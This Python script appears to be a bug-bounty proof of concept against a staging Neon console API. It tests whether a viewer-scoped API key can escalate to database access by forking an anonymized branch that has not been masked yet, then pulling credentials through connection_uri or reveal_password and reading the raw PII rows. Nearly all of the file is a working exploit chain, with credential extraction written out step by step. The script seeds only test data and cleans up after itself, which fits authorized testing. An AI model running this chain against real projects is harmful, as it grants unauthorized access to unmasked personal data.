# -*- coding: utf-8 -*-
"""U17B: full attack-chain under Viewer-scoped credential.
Q: Viewer (no connection strings per Aug-2026 model) forks an un-masked
anonymized branch (initialized state, raw data) - can it obtain a usable
data-plane credential and READ the raw rows?
Probes under viewer key: fork+endpoints, connection_uri, reveal/reset_password,
passwordless access. Full chain vs u17b-* branches. Zero-destruction.
"""
import json
import time
import ssl
import http.client
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _pg import connect, query

API_HOST = "console-stage.neon.build"
API_BASE = "/api/v2"
HB = {"X-Bug-Bounty": "xxbo"}
PA = "orange-sun-90493739"
PAMAIN = "br-wandering-field-w2ob6mpn"
LOG = r"F:\scan\neon_report\_u17b_out.txt"

with open(r"F:\scan\neon_report\_apikey.json", encoding="utf-8") as fh:
    MAINKEY = json.load(fh)["key"]


def out(s):
    print(s, flush=True)
    with open(LOG, "a", encoding="utf-8") as fh:
        fh.write(s + "\n")


def call(method, path, body=None, key=MAINKEY, timeout=60):
    ctx = ssl.create_default_context()
    conn = http.client.HTTPSConnection(API_HOST, timeout=timeout, context=ctx)
    payload = json.dumps(body) if body is not None else None
    hdrs = dict(HB, Authorization="Bearer " + key)
    if body is not None:
        hdrs["Content-Type"] = "application/json"
    conn.request(method, API_BASE + path, body=payload, headers=hdrs)
    resp = conn.getresponse()
    data = resp.read().decode("utf-8", "replace")
    conn.close()
    return resp.status, data


def pw_of(bid):
    st, d = call("GET", "/projects/%s/connection_uri?database_name=neondb&role_name=neondb_owner&branch_id=%s" % (PA, bid))
    if st != 200:
        return None, d[:120]
    from urllib.parse import urlsplit
    u = urlsplit(json.loads(d)["uri"])
    return (u.hostname, u.username, u.password), None


def try_dataplane(hp, table):
    try:
        c = connect(*hp)
        try:
            rows = query(c, "select * from %s" % table)
            c.close()
            return True, repr(rows)
        except Exception as e:
            try:
                c.close()
            except Exception:
                pass
            return False, "sql:%s" % str(e)[:120]
    except Exception as e:
        return False, "conn:%s" % str(e)[:120]


# ---- cleanup leftover viewer keys + branches ----
st, d = call("GET", "/api_keys")
for k in json.loads(d) if isinstance(json.loads(d), list) else json.loads(d).get("api_keys", []):
    if k.get("name", "").startswith("u17"):
        call("DELETE", "/api_keys/%s" % k["id"])
        out("cleaned key %s" % k["name"])
st, d = call("GET", "/projects/%s/branches" % PA)
for b in json.loads(d).get("branches", []):
    if b.get("name", "").startswith("u17"):
        call("DELETE", "/projects/%s/branches/%s" % (PA, b["id"]))
        out("cleaned branch %s" % b["name"])
time.sleep(2)

# ---- create viewer key ----
st, d = call("POST", "/api_keys", {"key_name": "u17b-viewer",
                                   "scope": {"project_id": PA, "permission": "viewer"}})
VKEY = json.loads(d).get("key")
out("viewer key: %s %s" % (st, VKEY[:20] + "..." if VKEY else d[:200]))

# ---- stage A: what can viewer read? ----
out("\n=== A viewer read probes ===")
st, d = call("GET", "/projects/%s/connection_uri?database_name=neondb&role_name=neondb_owner&branch_id=%s" % (PA, PAMAIN), key=VKEY)
out("A viewer GET connection_uri(main): %s %s" % (st, d[:250]))
st, d = call("POST", "/projects/%s/branches/%s/roles/neondb_owner/reveal_password" % (PA, PAMAIN), {}, key=VKEY)
out("A viewer reveal_password(main): %s %s" % (st, d[:200]))

# ---- stage B: viewer fork WITH endpoints ----
out("\n=== B viewer fork with endpoint ===")
st, d = call("POST", "/projects/%s/branches" % PA,
             {"branch": {"name": "u17b-vfork", "parent_id": PAMAIN},
              "endpoints": [{"type": "read_write"}]}, key=VKEY)
out("B viewer fork+endpoint: %s" % st)
VB = None
if st in (200, 201):
    j = json.loads(d)
    VB = j.get("branch", {}).get("id")
    has_uri = "connection_uris" in json.dumps(j)
    out("B fork id=%s conn_in_resp=%s" % (VB, has_uri))
    if has_uri:
        out("B conn sample: %s" % json.dumps(j.get("connection_uris"))[:300])
    # wait ready then try to get password as viewer
    okw = False
    for _ in range(20):
        st2, d2 = call("GET", "/projects/%s/branches/%s" % (PA, VB), key=VKEY)
        b = json.loads(d2).get("branch", {}) if st2 == 200 else {}
        if b.get("current_state") == "ready" and not b.get("pending_state"):
            okw = True
            break
        time.sleep(4)
    out("B fork ready: %s" % okw)
    st, d = call("GET", "/projects/%s/connection_uri?database_name=neondb&role_name=neondb_owner&branch_id=%s" % (PA, VB), key=VKEY)
    out("B viewer GET connection_uri(fork): %s %s" % (st, d[:250]))
    st, d = call("POST", "/projects/%s/branches/%s/roles/neondb_owner/reveal_password" % (PA, VB), {}, key=VKEY)
    out("B viewer reveal_password(fork): %s %s" % (st, d[:250]))

# ---- stage C: full chain vs initialized anonymized branch ----
out("\n=== C full chain (viewer reads raw data of never-started anon branch) ===")
# 1) admin: src + data
st, d = call("POST", "/projects/%s/branches" % PA,
             {"branch": {"name": "u17b-src", "parent_id": PAMAIN},
              "endpoints": [{"type": "read_write"}]})
SRC = json.loads(d)["branch"]["id"]
hp = None
for i in range(20):
    hp, err = pw_of(SRC)
    if hp:
        break
    time.sleep(4)
conn = None
for i in range(20):
    try:
        conn = connect(*hp)
        break
    except Exception:
        time.sleep(4)
query(conn, "create table if not exists u17b_pii(id int, email text, secret text)")
query(conn, "delete from u17b_pii")
query(conn, "insert into u17b_pii values (1,'alice.real@victimcorp.com','ssn-111'),(2,'bob.ceo@victimcorp.com','ssn-222')")
out("C src seeded")
conn.close()
# 2) admin: anonymized branch start=false (initialized, raw data)
st, d = call("POST", "/projects/%s/branch_anonymized" % PA, {
    "branch_create": {"branch": {"name": "u17b-anon", "parent_id": SRC},
                      "endpoints": [{"type": "read_write"}]},
    "masking_rules": [{
        "database_name": "neondb", "schema_name": "public",
        "table_name": "u17b_pii", "column_name": "email",
        "masking_function": "anon.fake_email()"}],
    "start_anonymization": False,
})
ANON = json.loads(d)["branch"]["id"]
out("C anon(id=%s) created (initialized, raw)" % ANON)
# viewer can see it?
st, d = call("GET", "/projects/%s/branches" % PA, key=VKEY)
names = [b.get("name") for b in json.loads(d).get("branches", [])]
out("C viewer sees branches: u17b-anon visible=%s" % ("u17b-anon" in names))
# 3) viewer: fork the initialized anon branch (no params, current state) + endpoint
st, d = call("POST", "/projects/%s/branches" % PA,
             {"branch": {"name": "u17b-vrec", "parent_id": ANON},
              "endpoints": [{"type": "read_write"}]}, key=VKEY)
out("C viewer fork of anon(init): %s %s" % (st, d[:250]))
REC = None
if st in (200, 201):
    j = json.loads(d)
    REC = j.get("branch", {}).get("id")
    out("C rec id=%s ra=%s" % (REC, j.get("branch", {}).get("restricted_actions")))
# 4) viewer: get credential & read
if REC:
    for _ in range(24):
        st2, d2 = call("GET", "/projects/%s/branches/%s" % (PA, REC), key=VKEY)
        b = json.loads(d2).get("branch", {}) if st2 == 200 else {}
        if b.get("current_state") == "ready" and not b.get("pending_state"):
            break
        time.sleep(4)
    cred = None
    st, d = call("GET", "/projects/%s/connection_uri?database_name=neondb&role_name=neondb_owner&branch_id=%s" % (PA, REC), key=VKEY)
    out("C viewer GET connection_uri(rec): %s %s" % (st, d[:200]))
    if st == 200:
        from urllib.parse import urlsplit
        u = urlsplit(json.loads(d)["uri"])
        cred = (u.hostname, u.username, u.password)
    else:
        st, d = call("POST", "/projects/%s/branches/%s/roles/neondb_owner/reveal_password" % (PA, REC), {}, key=VKEY)
        out("C viewer reveal_password(rec): %s %s" % (st, d[:200]))
        if st == 200:
            cred = (None, "neondb_owner", json.loads(d).get("password"))
            st2, d2 = call("GET", "/projects/%s/branches/%s/endpoints" % (PA, REC), key=VKEY)
            if st2 == 200:
                eps = json.loads(d2).get("endpoints", [])
                if eps:
                    cred = (eps[0].get("host"), "neondb_owner", cred[2])
    if cred and cred[0]:
        okd, r = try_dataplane(cred, "u17b_pii")
        raw = "alice.real" in r
        out("C VIEWER DATA-PLANE READ: ok=%s RAW=%s %s" % (okd, raw, r[:200]))
    else:
        out("C viewer could not obtain credential (chain ends)")

# ---- cleanup ----
out("\n=== cleanup ===")
for bid in (REC, ANON, SRC, VB):
    if bid:
        st, d = call("DELETE", "/projects/%s/branches/%s" % (PA, bid))
        out("del branch %s: %s" % (bid, st))
        time.sleep(2)
st, d = call("GET", "/api_keys")
for k in json.loads(d) if isinstance(json.loads(d), list) else json.loads(d).get("api_keys", []):
    if k.get("name", "").startswith("u17"):
        call("DELETE", "/api_keys/%s" % k["id"])
        out("del key %s" % k["name"])
st, d = call("GET", "/projects/%s/branches" % PA)
out("FINAL:")
for b in json.loads(d).get("branches", []):
    out("  %-24s %s" % (b.get("name"), b.get("id")))
print("== DONE", flush=True)
